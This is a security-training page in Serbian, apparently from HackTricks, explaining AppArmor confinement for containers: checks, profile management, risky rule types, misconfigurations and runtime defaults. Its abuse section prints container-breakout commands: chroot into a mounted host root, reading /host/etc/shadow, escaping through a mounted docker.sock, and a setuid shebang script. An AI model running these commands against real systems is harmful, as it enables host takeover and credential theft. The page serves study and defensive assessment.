# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

AppArmor je sistem **obavezne kontrole pristupa** koji primenjuje ograničenja putem profila za svaki program. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupe, AppArmor omogućava kernelu da sprovodi pravila povezana sa samim procesom. U kontejnerskim okruženjima, ovo je važno zato što radno opterećenje može imati dovoljno tradicionalnih privilegija da pokuša neku radnju, ali joj AppArmor ipak može zabraniti pristup jer njegov profil ne dozvoljava odgovarajuću putanju, mount, mrežno ponašanje ili upotrebu capability-ja.

Najvažnije je razumeti da je AppArmor **zasnovan na putanjama**. Pristup datotekama određuje pomoću pravila za putanje, a ne pomoću oznaka kao SELinux. Zbog toga je pristupačan i moćan, ali bind mount-ovi i alternativni rasporedi putanja zahtevaju pažljivo razmatranje. Ako isti sadržaj sa hosta postane dostupan preko druge putanje, efekat pravila možda neće biti onakav kakav je operator prvobitno očekivao.

## Uloga u izolaciji kontejnera

Bezbednosne provere kontejnera često se zaustavljaju na capabilities i seccomp-u, ali AppArmor ostaje važan i nakon tih provera. Zamislite kontejner sa više privilegija nego što bi trebalo da ima ili radno opterećenje kojem je iz operativnih razloga bila potrebna još jedna capability. AppArmor i dalje može da ograniči pristup datotekama, ponašanje mount-a, umrežavanje i obrasce izvršavanja, čime zaustavlja očigledan put zloupotrebe. Zato isključivanje AppArmor-a „samo da bi aplikacija radila“ može neprimetno da pretvori konfiguraciju koja je tek rizična u onu koja se aktivno može iskoristiti.

## Laboratorija

Da biste proverili da li je AppArmor aktivan na hostu, koristite:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Da biste videli pod kojim se profilom trenutno izvršava proces kontejnera:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Razlika je poučna. U uobičajenom slučaju, proces bi trebalo da prikazuje AppArmor kontekst povezan sa profilom koji je izabrao runtime. U slučaju unconfined, ovaj dodatni sloj ograničenja nestaje.

Možete da proverite i šta Docker misli da je primenio:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Upotreba tokom izvršavanja

Docker može da primeni podrazumevani ili prilagođeni AppArmor profil ako ga host podržava. Podman takođe može da se integriše sa AppArmor-om na sistemima zasnovanim na AppArmor-u, iako na distribucijama koje prvenstveno koriste SELinux često glavnu ulogu ima drugi MAC sistem. Kubernetes može da izloži AppArmor pravila na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna okruženja za sistemske kontejnere iz porodice Ubuntu takođe u velikoj meri koriste AppArmor.

Praktično gledano, AppArmor nije „Docker funkcija“. To je funkcija jezgra hosta koju različiti runtime-i mogu da primene. Ako je host ne podržava ili je runtime podešen da radi bez ograničenja, navodna zaštita zapravo ne postoji.

Konkretno za Kubernetes, savremeni API je `securityContext.appArmorProfile`. Od Kubernetes `v1.30`, starije beta AppArmor anotacije su zastarele. Na podržanim hostovima, `RuntimeDefault` je podrazumevani profil, dok `Localhost` upućuje na profil koji već mora biti učitan na čvoru. Ovo je važno tokom provere, jer manifest može izgledati kao da koristi AppArmor, a da i dalje u potpunosti zavisi od podrške na strani čvora i unapred učitanih profila.<sup>[[1]](#references)</sup>

Jedan suptilan, ali koristan operativni detalj jeste da je eksplicitno podešavanje `appArmorProfile.type: RuntimeDefault` strože od pukog izostavljanja tog polja. Ako je polje eksplicitno podešeno, a čvor ne podržava AppArmor, prijem bi trebalo da bude odbijen. Ako je polje izostavljeno, workload i dalje može da se pokrene na čvoru bez AppArmor-a, samo bez tog dodatnog sloja ograničenja. Iz perspektive napadača, ovo je dobar razlog da proveri i manifest i stvarno stanje čvora.<sup>[[1]](#references)</sup>

Na hostovima sa AppArmor-om koji podržavaju Docker, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby AppArmor šablona i važan je zato što objašnjava zašto neki PoC-ovi zasnovani na capabilities i dalje ne uspevaju u podrazumevanom kontejneru. Uopšteno, `docker-default` dozvoljava uobičajeno umrežavanje, zabranjuje pisanje u veliki deo sistema `/proc`, zabranjuje pristup osetljivim delovima sistema `/sys`, blokira operacije mount-a i ograničava ptrace tako da se ne može koristiti kao opšta primitiva za ispitivanje hosta. Poznavanje tog osnovnog podešavanja pomaže da se razlikuje „kontejner ima `CAP_SYS_ADMIN`“ od „kontejner zaista može da upotrebi tu capability na interfejsima jezgra koji su mi važni“.

## Upravljanje profilima

AppArmor profili se obično čuvaju u `/etc/apparmor.d/`. Uobičajena konvencija za imenovanje je da se kose crte u putanji izvršne datoteke zamene tačkama. Na primer, profil za `/usr/bin/man` obično se čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je važan i za odbranu i za procenu, jer kada saznate naziv aktivnog profila, često možete brzo da pronađete odgovarajuću datoteku na hostu.

Korisne komande za upravljanje na strani hosta uključuju:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Razlog zbog kog su ove komande važne u priručniku o bezbednosti kontejnera jeste to što objašnjavaju kako se profili zaista prave, učitavaju, prebacuju u complain mode i menjaju nakon izmena aplikacije. Ako operater ima običaj da tokom rešavanja problema prebaci profile u complain mode i zaboravi da ponovo uključi enforcement, kontejner u dokumentaciji može delovati zaštićeno, dok se u stvarnosti ponaša mnogo manje restriktivno.

### Pravljenje i ažuriranje profila

`aa-genprof` može da prati ponašanje aplikacije i pomogne u interaktivnom generisanju profila:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` može da generiše profil-šablon koji se kasnije može učitati pomoću `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Kada se binarni fajl promeni i pravila treba ažurirati, `aa-logprof` može ponovo da obradi odbijanja zabeležena u dnevnicima i pomogne operatoru da odluči da li da ih dozvoli ili odbije:

```bash
sudo aa-logprof
```

### Dnevnici

Odbijanja pristupa u AppArmor-u često su vidljiva kroz `auditd`, `syslog` ili alate kao što je `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Ovo je korisno u operativnom i ofanzivnom kontekstu. Branioci to koriste za doterivanje profila. Napadači to koriste da bi saznali koja se tačno putanja ili operacija blokira i da li je AppArmor kontrola koja zaustavlja exploit chain.

### Identifikovanje tačne datoteke profila

Kada runtime prikaže određeni AppArmor profil za kontejner, često je korisno utvrditi koja datoteka profila na disku odgovara tom nazivu:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Ovo je naročito korisno tokom pregleda sa strane hosta, jer premošćava jaz između „kontejner navodi da radi pod profilom `lowpriv`“ i „stvarna pravila nalaze se u ovoj konkretnoj datoteci, koju je moguće proveriti ili ponovo učitati“.

### Pravila visokog prioriteta za proveru

Kada možete da pročitate profil, nemojte se zaustaviti na jednostavnim linijama `deny`. Nekoliko tipova pravila bitno utiče na to koliko će AppArmor biti koristan u sprečavanju pokušaja izlaska iz kontejnera:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: izvršavajte ciljnu binarnu datoteku bez ograničenja. Ako je dostupan pomoćni program, shell ili interpreter dozvoljen pod `ux`, to je obično prvo što treba testirati.
- `px` / `Px` i `cx` / `Cx`: obavljaju promene profila pri exec-u. To nije automatski loše, ali vredi proveriti jer promena može dovesti do profila sa znatno širim ovlašćenjima od trenutnog.
- `change_profile`: omogućava zadatku da odmah ili pri sledećem exec-u pređe u drugi učitani profil. Ako je odredišni profil slabiji, to može postati predviđeni izlaz iz restriktivnog domena.
- `flags=(complain)`, `flags=(unconfined)` ili noviji `flags=(prompt)`: ove opcije treba da utiču na to koliko poverenja polažete u profil. `complain` beleži odbijanja umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od putanje odlučivanja u userspace-u, umesto od isključivog odbijanja koje sprovodi kernel.
- `userns` ili `userns create,`: novija AppArmor pravila mogu da posreduju pri kreiranju user namespace-a. Ako profil kontejnera to izričito dozvoljava, ugnježdeni user namespace-i ostaju mogući čak i kada platforma koristi AppArmor kao deo strategije za jačanje bezbednosti.

Korisna grep pretraga sa strane hosta:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ova vrsta provere često je korisnija nego proučavanje stotina uobičajenih pravila za fajlove. Ako breakout zavisi od pokretanja pomoćnog programa, ulaska u novi namespace ili prelaska u manje restriktivan profil, odgovor se često krije u ovim pravilima za prelaze, a ne u očiglednim linijama u stilu `deny /etc/shadow r`.

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori ga često postavljaju dok otklanjaju probleme u aplikaciji koju je profil ispravno blokirao jer je pokušala nešto opasno ili neočekivano. Ako ova zastavica ostane u produkciji, ceo MAC sloj je praktično uklonjen.

Drugi suptilan problem je pretpostavka da su bind mount-ovi bezopasni zato što dozvole za fajlove izgledaju uobičajeno. Pošto je AppArmor zasnovan na putanjama, izlaganje putanja hosta pod alternativnim lokacijama za mount može loše da utiče na pravila za putanje. Treća greška je zaboravljanje da naziv profila u konfiguracionom fajlu malo znači ako kernel hosta zapravo ne sprovodi AppArmor.

## Zloupotreba

Kada AppArmor više nije aktivan, operacije koje su ranije bile ograničene mogu iznenada da uspeju: čitanje osetljivih putanja preko bind mount-ova, pristup delovima procfs-a ili sysfs-a kojima je trebalo da bude teže pristupiti, obavljanje radnji povezanih sa mount-om ako to dozvoljavaju i capabilities i seccomp, ili korišćenje putanja koje bi profil inače zabranio. AppArmor je često mehanizam koji objašnjava zašto pokušaj breakout-a zasnovan na capabilities-ima „treba da uspe“ na papiru, ali u praksi ipak ne uspeva. Uklonite AppArmor i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavna prepreka u lancu zloupotrebe zasnovanom na path-traversal-u, bind mount-u ili mount-u, prvi korak je obično da uporedite šta postaje dostupno sa profilom i bez njega. Na primer, ako je putanja hosta montirana unutar kontejnera, počnite tako što ćete proveriti da li možete da joj pristupite i čitate je:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Ako kontejner takođe poseduje opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova jeste da proverite da li je AppArmor kontrola koja blokira mount operacije ili pristup osetljivim kernel fajl-sistemima:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

U okruženjima u kojima je putanja hosta već dostupna putem bind mount-a, gubitak AppArmor zaštite može takođe pretvoriti problem otkrivanja informacija koji omogućava samo čitanje u direktan pristup fajlovima hosta:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Svrha ovih komandi nije da AppArmor sam po sebi omogući izlazak iz kontejnera. Poenta je da, kada se AppArmor ukloni, mnogi načini zloupotrebe zasnovani na fajl-sistemu i mount-ovima mogu odmah da se testiraju.

### Potpun primer: AppArmor onemogućen + root hosta montiran

Ako je root hosta već bind-mounted u kontejner na putanji `/host`, uklanjanje AppArmor-a može da pretvori blokiran način zloupotrebe fajl-sistema u potpuni izlazak sa hosta:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Kada se shell izvršava preko host filesystema, workload je praktično izašao iz granica kontejnera:

```bash
id
hostname
cat /etc/shadow | head
```

### Potpun primer: AppArmor onemogućen + Runtime Socket

Ako je AppArmor oko stanja runtime okruženja bio stvarna prepreka, montirani soket može biti dovoljan za potpuno bekstvo:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Tačna putanja zavisi od tačke montiranja, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, a runtime API može da pokrene kontejner koji kompromituje host.

### Ceo primer: Zaobilaženje zasnovano na putanji pomoću bind-mounta

Pošto je AppArmor zasnovan na putanjama, zaštita za `/proc/**` ne štiti automatski isti sadržaj host procfs-a kada mu se može pristupiti preko druge putanje:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Uticaj zavisi od toga šta je tačno montirano i da li alternativna putanja zaobilazi i druge kontrole, ali ovaj obrazac je jedan od najjasnijih razloga zašto AppArmor treba procenjivati zajedno sa rasporedom mount-ova, a ne izolovano.

### Ceo primer: Zaobilaženje pomoću shebang-a

AppArmor može da pridruži profil putanji izvršene skripte, a ne interpreteru navedenom u njenom shebang-u. Nasuprot tome, direktnim pozivanjem interpretera može se aktivirati profil tog interpretera. [Ovu razliku opisuje održavalac AppArmor-a](https://bugs.launchpad.net/apparmor/+bug/1911431). Istorijski primer obuhvatao je skriptu čiji prvi red upućuje na interpreter ograničen profilom:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Primer je samo kandidat za slučaj u kojem mogućnost datoteke interpretera može da postane efektivna i stvarni exec attachment skripte dozvoljava tu operaciju. Proverite učitanu politiku i oznaku procesa, bounding set mogućnosti, `no_new_privs` i stanje `nosuid` na mount-u; samo ime datoteke profila ili listing `cap_setuid+ep` ne dokazuju da je prelaz moguć. Lanci interpretera i alternativni putevi izvršavanja zahtevaju zasebnu proveru.

## Provere

Cilj ovih provera je da brzo odgovore na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen i da li je runtime zaista primenio profil na ovaj kontejner?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Šta je ovde zanimljivo:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, radno opterećenje nema koristi od AppArmor ograničenja.
- Ako `aa-status` prikazuje da je AppArmor onemogućen ili nije učitan, svaki naziv profila u runtime konfiguraciji uglavnom je samo kozmetički.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani prilagođeni profil, to je često razlog zbog kog funkcioniše put zloupotrebe zasnovan na sistemu datoteka ili mount-u.
- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, konfiguracija runtime-a ili orkestratora sama po sebi nije dovoljna.
- Ako navodno ojačani profil sadrži pravila kao što su `ux`, široko postavljeni `change_profile`, `userns` ili `flags=(complain)`, stvarna granica zaštite može biti znatno slabija nego što naziv profila sugeriše.

Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor-a uključenim često pravi razliku između kontrolisanog izuzetka i znatno šireg bezbednosnog propusta.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano uključen na hostovima koji podržavaju AppArmor | Koristi AppArmor profil `docker-default`, osim ako nije zamenjen | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisi od hosta | AppArmor je podržan putem `--security-opt`, ali tačno podrazumevano ponašanje zavisi od hosta/runtime-a i nije tako univerzalno kao Docker-ov dokumentovani profil `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije naveden, podrazumevana vrednost je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
| containerd / CRI-O pod Kubernetes-om | Zavisi od podrške čvora/runtime-a | Runtime-i koje Kubernetes uobičajeno podržava podržavaju AppArmor, ali stvarno sprovođenje i dalje zavisi od podrške čvora i podešavanja radnog opterećenja | Isto kao u redu za Kubernetes; direktna konfiguracija runtime-a takođe može potpuno da preskoči AppArmor |

Kod AppArmor-a je najvažnija promenljiva često **host**, a ne samo runtime. Podešavanje profila u manifestu ne uspostavlja ograničenja na čvoru na kom AppArmor nije omogućen.

## References

- [1] [Kubernetes bezbednosni kontekst: polja AppArmor profila i ponašanje u vezi s podrškom čvorova](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 priručnik `apparmor.d(5)`: exec prelazi, `change_profile`, `userns` i oznake profila](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
